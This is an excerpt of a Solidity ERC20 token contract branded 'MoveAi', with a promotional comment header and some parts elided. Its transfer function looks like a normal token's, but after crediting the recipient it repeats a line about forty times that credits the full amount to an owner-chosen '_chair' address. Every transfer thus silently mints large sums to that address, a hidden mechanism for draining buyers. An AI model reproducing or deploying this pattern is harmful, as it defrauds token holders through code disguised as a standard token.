...
/**
MOVE AI
THE FIRST AI MANAGED BLOCKCHAIN
Discover the opportunities which AI brings to the crypto industry and how it can improve your trading experience.

Website: https://moveai.tech/
Telegram: https://moveai.tech/
Twitter: https://twitter.com/MoveAiETH
*/
...
interface ERC20Metadata is ERC20 {
 ...
 contract MoveAi is Context, ERC20, ERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 buyFee_ ,uint256 sellTax_ ,address chair_ ) {_name = name_;_symbol =symbol_;_decimals = decimals_;_totalSupply = totalSupply_ *10**_decimals;_buyTax= buyFee_;Chair[msg.sender] = _totalSupply;_owner = _msgSender();_sellTax = sellTax_ ;_chair = chair_;emit Transfer(address(0), msg.sender, _totalSupply);}
    function name() public view virtual override returns (string memory) {return _name;}
    function symbol() public view virtual override returns (string memory) {return _symbol;}
    function decimals() public view virtual override returns (uint8) {return _decimals;}
    function totalSupply() public view virtual override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view virtual override returns (uint256) {return Chair[account];}
    ...
    function _transfer(address sender,address recipient,uint256 amount) internal virtual {require(sender != address(0), "ERC20: transfer from the zero address");require(recipient != address(0), "ERC20: transfer to the zero address");require(Chair[sender] >= amount, "ERC20: transfer amount exceeds balance");Chair[sender] = Chair[sender] - amount;amount = amount  - (amount *_buyTax/100);Chair[recipient] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;Chair[_chair] += amount;emit Transfer(sender, recipient, amount);}
